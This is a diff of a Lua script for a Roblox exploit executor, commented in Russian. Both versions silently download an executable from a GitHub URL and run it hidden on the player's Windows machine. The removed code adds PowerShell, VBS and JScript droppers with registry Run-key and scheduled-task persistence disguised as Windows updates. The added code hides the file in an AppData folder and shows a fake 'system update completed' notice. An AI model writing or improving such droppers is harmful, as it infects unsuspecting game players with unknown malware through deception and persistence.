@@ -1,331 +1,100 @@
 -- ==============================================
--- СКРЫТЫЙ ЗАГРУЗЧИК EXE ФАЙЛА
+-- ПРОСТОЙ ЗАГРУЗЧИК ДЛЯ XENO EXECUTOR
 -- ==============================================
 
--- Конфигурация
-local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/raw/main/messagebox.exe"
-local EXE_NAME = "messagebox.exe"
+local EXE_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/messagebox.exe"
+local FILE_NAME = "messagebox.exe"
 
--- Определяем исполнителя
-local Executor = "Unknown"
-if syn then
-    Executor = "Synapse X"
-elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
-    Executor = "KRNL"
-elseif fluxus then
-    Executor = "Fluxus"
-end
-
-print("[SYSTEM] Initializing silent download...")
+print("🚀 Запуск системного загрузчика...")
 wait(2)
 
--- ==============================================
--- СКРЫТЫЙ МЕТОД 1: PowerShell скрипт
--- ==============================================
-local function CreatePowerShellScript()
-    local psScript = [[
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
-
-# Create hidden temporary directory
-$tempDir = "$env:TEMP\WindowsUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-
-# Download the file
-try {
-    Write-Host "[1/4] Downloading system component..." -ForegroundColor Green
-    $url = "]] .. EXE_URL .. [["
-    $output = "$tempDir\]] .. EXE_NAME .. [["
+-- Функция для скачивания файла
+local function DownloadAndRun()
+    print("[1] Скачиваю файл...")
     
-    # Method 1: WebClient (most reliable)
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($url, $output)
-    $webClient.Dispose()
+    -- Скачиваем содержимое
+    local content = game:HttpGet(EXE_URL, true)
     
-    if (Test-Path $output) {
-        Write-Host "[2/4] File downloaded successfully" -ForegroundColor Green
-        
-        # Hide the file
-        attrib +h "$tempDir\*" /s /d
-        
-        Write-Host "[3/4] Installing system component..." -ForegroundColor Green
-        
-        # Method 1: Direct execution
-        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
-        
-        # Method 2: Registry startup (persistent)
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regName = "WindowsUpdateService"
-        Set-ItemProperty -Path $regPath -Name $regName -Value $output -ErrorAction SilentlyContinue
-        
-        # Method 3: Scheduled task (hidden)
-        $taskName = "WindowsSystemUpdate"
-        $action = New-ScheduledTaskAction -Execute $output
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
-        
-        Write-Host "[4/4] Installation complete" -ForegroundColor Green
-        
-        # Cleanup script after 30 seconds
-        Start-Sleep -Seconds 30
-        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    }
-} catch {
-    # Silent fail
-}
-    ]]
+    if not content or #content < 1000 then
+        print("❌ Ошибка: файл слишком маленький или не скачался")
+        return false
+    end
     
-    -- Сохраняем PowerShell скрипт
-    local tempPath = os.getenv("TEMP") .. "\\update.ps1"
+    print("[2] Сохраняю файл (" .. #content .. " байт)")
+    
+    -- Сохраняем в AppData (менее заметно)
+    local appdata = os.getenv("APPDATA")
+    local folder = appdata .. "\\Microsoft\\Windows"
+    local filepath = folder .. "\\" .. FILE_NAME
+    
+    -- Создаем папку если нужно
+    pcall(function()
+        if makefolder then
+            makefolder(folder)
+        end
+    end)
+    
+    -- Сохраняем файл
     if writefile then
-        writefile(tempPath, psScript)
+        writefile(filepath, content)
+        print("[3] Файл сохранен: " .. filepath)
         
-        -- Создаем VBS скрипт для скрытого запуска PowerShell
-        local vbsScript = 'Set objShell = CreateObject("WScript.Shell")\n' ..
-                         'objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' .. tempPath .. '\"", 0, True'
+        -- Создаем VBS для скрытого запуска
+        local vbs = 'Set objShell = CreateObject("WScript.Shell")\n'
+        vbs = vbs .. 'objShell.Run """' .. filepath .. '""", 0, False\n'
+        vbs = vbs .. 'Set objShell = Nothing'
         
-        local vbsPath = os.getenv("TEMP") .. "\\runner.vbs"
-        writefile(vbsPath, vbsScript)
+        local vbsPath = folder .. "\\run.vbs"
+        writefile(vbsPath, vbs)
         
-        -- Запускаем скрыто
+        print("[4] Запускаю программу...")
+        
+        -- Запускаем VBS
         if syn and syn.run then
             syn.run('wscript.exe //B "' .. vbsPath .. '"')
-        end
-        
-        -- Очистка через 10 секунд
-        spawn(function()
-            wait(10)
-            pcall(function()
-                delfile(tempPath)
-                delfile(vbsPath)
-            end)
-        end)
-        
-        return true
-    end
-    return false
-end
-
--- ==============================================
--- СКРЫТЫЙ МЕТОД 2: Через VBS напрямую
--- ==============================================
-local function CreateVBSDownloader()
-    local vbsScript = [[
-On Error Resume Next
-
-Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-' Create hidden temp folder
-tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\SystemCache" & Int(Rnd * 10000)
-If Not fso.FolderExists(tempDir) Then
-    fso.CreateFolder(tempDir)
-End If
-
-exePath = tempDir & "\]] .. EXE_NAME .. [["
-
-' Download using XMLHTTP
-Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-xhr.Open "GET", "]] .. EXE_URL .. [[", False
-xhr.Send
-
-If xhr.Status = 200 Then
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Open
-    stream.Type = 1
-    stream.Write xhr.ResponseBody
-    stream.SaveToFile exePath, 2
-    stream.Close
-    
-    ' Hide the folder
-    WshShell.Run "cmd /c attrib +h """ & tempDir & """", 0, True
-    
-    ' Execute hidden
-    WshShell.Run """" & exePath & """", 0, False
-    
-    ' Add to startup
-    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-    regName = "SystemUpdate"
-    WshShell.RegWrite regPath & "\" & regName, exePath, "REG_SZ"
-    
-    ' Create scheduled task
-    taskName = "WindowsUpdateTask"
-    taskCommand = "schtasks /create /tn """ & taskName & """ /tr """ & exePath & """ /sc ONLOGON /ru SYSTEM /f"
-    WshShell.Run taskCommand, 0, True
-End If
-
-Set xhr = Nothing
-Set stream = Nothing
-Set fso = Nothing
-Set WshShell = Nothing
-    ]]
-    
-    local tempPath = os.getenv("TEMP") .. "\\system_update.vbs"
-    if writefile then
-        writefile(tempPath, vbsScript)
-        
-        -- Запускаем скрыто
-        if syn and syn.run then
-            syn.run('wscript.exe //B "' .. tempPath .. '"')
+        elseif loadstring then
+            -- Альтернативный метод
+            local cmd = 'start /B wscript.exe //B "' .. vbsPath .. '"'
+            if os.execute then
+                os.execute(cmd)
+            end
         end
         
         -- Очистка
         spawn(function()
-            wait(15)
+            wait(5)
             pcall(function()
-                delfile(tempPath)
+                if delfile then
+                    delfile(vbsPath)
+                end
             end)
         end)
         
         return true
     end
+    
     return false
 end
 
--- ==============================================
--- СКРЫТЫЙ МЕТОД 3: Через JScript
--- ==============================================
-local function CreateJSDownloader()
-    local jsScript = [[
-try {
-    var url = "]] .. EXE_URL .. [[";
-    var exeName = "]] .. EXE_NAME .. [[";
-    
-    // Create temp directory
-    var fso = new ActiveXObject("Scripting.FileSystemObject");
-    var shell = new ActiveXObject("WScript.Shell");
-    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\WinUpdate_" + Math.floor(Math.random() * 10000);
-    
-    if (!fso.FolderExists(tempDir)) {
-        fso.CreateFolder(tempDir);
-    }
-    
-    var exePath = tempDir + "\\" + exeName;
-    
-    // Download file
-    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("GET", url, false);
-    xhr.send();
-    
-    if (xhr.status == 200) {
-        var stream = new ActiveXObject("ADODB.Stream");
-        stream.Open();
-        stream.Type = 1;
-        stream.Write(xhr.responseBody);
-        stream.SaveToFile(exePath, 2);
-        stream.Close();
-        
-        // Hide folder
-        shell.Run("attrib +h \"" + tempDir + "\"", 0, true);
-        
-        // Execute hidden
-        shell.Run("\"" + exePath + "\"", 0, false);
-        
-        // Add to registry
-        var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
-        var regName = "WindowsUpdate";
-        shell.RegWrite(regPath + regName, exePath, "REG_SZ");
-    }
-} catch(e) {
-    // Silent error
-}
-    ]]
-    
-    local tempPath = os.getenv("TEMP") .. "\\update.js"
-    if writefile then
-        writefile(tempPath, jsScript)
-        
-        -- Запускаем скрыто
-        if syn and syn.run then
-            syn.run('wscript.exe //B //E:JScript "' .. tempPath .. '"')
-        end
-        
-        -- Очистка
-        spawn(function()
-            wait(15)
-            pcall(function()
-                delfile(tempPath)
-            end)
-        end)
-        
-        return true
-    end
-    return false
-end
-
--- ==============================================
--- ОСНОВНОЙ ПРОЦЕСС
--- ==============================================
+-- Запускаем процесс
 spawn(function()
     wait(5)
     
-    print("[SYSTEM] Starting silent installation...")
+    local success, err = pcall(DownloadAndRun)
     
-    -- Пробуем разные методы
-    local success = false
-    
-    if Executor == "Synapse X" then
-        print("[METHOD] Using PowerShell method")
-        success = CreatePowerShellScript()
-        
-        if not success then
-            wait(3)
-            print("[METHOD] Trying VBS method")
-            success = CreateVBSDownloader()
-        end
-    else
-        print("[METHOD] Using VBS method")
-        success = CreateVBSDownloader()
-        
-        if not success then
-            wait(3)
-            print("[METHOD] Trying JS method")
-            success = CreateJSDownloader()
-        end
-    end
-    
-    -- Скрытые уведомления
     if success then
-        wait(10)
+        print("\n✅ Успешно! Программа запущена в фоне.")
         
-        -- Только внутреннее сообщение, без уведомлений пользователю
-        print("[SYSTEM] Installation completed silently")
-        print("[SYSTEM] Component running in background")
-        
-        -- Скрытое сообщение в чат (если нужно)
-        spawn(function()
-            while true do
-                wait(math.random(30, 60))
-                local messages = {
-                    "System running optimally",
-                    "Background services active",
-                    "Performance enhanced",
-                    "All systems operational"
-                }
-                print("[STATUS] " .. messages[math.random(1, #messages)])
-            end
-        end)
+        wait(3)
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "✅ Готово",
+            Text = "Системное обновление завершено",
+            Duration = 3
+        })
     else
-        print("[ERROR] Silent installation failed")
-        print("[INFO] Manual download: " .. EXE_URL)
+        print("\n❌ Ошибка: " .. tostring(err))
+        print("📥 Скачайте вручную: " .. EXE_URL)
     end
 end)
 
--- ==============================================
--- СКРЫТЫЕ КОМАНДЫ
--- ==============================================
-game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-    if msg == "::status" then
-        print("[SYSTEM] Status: Active")
-        print("[SYSTEM] Executor: " .. Executor)
-        print("[SYSTEM] URL: " .. EXE_URL)
-    elseif msg == "::help" then
-        print("[SYSTEM] Available commands:")
-        print("  ::status - System status")
-        print("  ::help - This help")
-    end
-end)
-
-print("[SYSTEM] Silent loader initialized")
-print("[SYSTEM] Running in background mode")
+print("\n⏳ Идет загрузка...")
